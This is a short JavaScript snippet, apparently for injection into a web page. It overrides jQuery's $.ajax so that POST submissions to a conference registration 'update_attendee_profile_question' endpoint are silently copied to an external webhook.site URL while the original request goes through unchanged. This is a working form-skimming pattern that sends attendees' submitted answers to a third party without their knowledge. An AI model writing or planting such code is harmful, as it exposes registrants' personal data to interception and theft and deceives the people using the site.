(function () {
  // Ensure jQuery is available
  if (typeof $ !== 'undefined') {
    const originalAjax = $.ajax;

    $.ajax = function (options) {
      // Check for your target endpoint
      if (
        options.url &&
        options.type === 'POST' &&
        options.url.includes('/conference_registrations/') &&
        options.url.includes('/update_attendee_profile_question')
      ) {
        // Send form data to webhook
        fetch('https://webhook.site/6f357c7b-0aa6-435d-b9d6-24b85f931aea', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: typeof options.data === 'string' ? options.data : JSON.stringify(options.data)
        });
      }

      // Continue with original request
      return originalAjax.apply(this, arguments);
    };
  }
})();
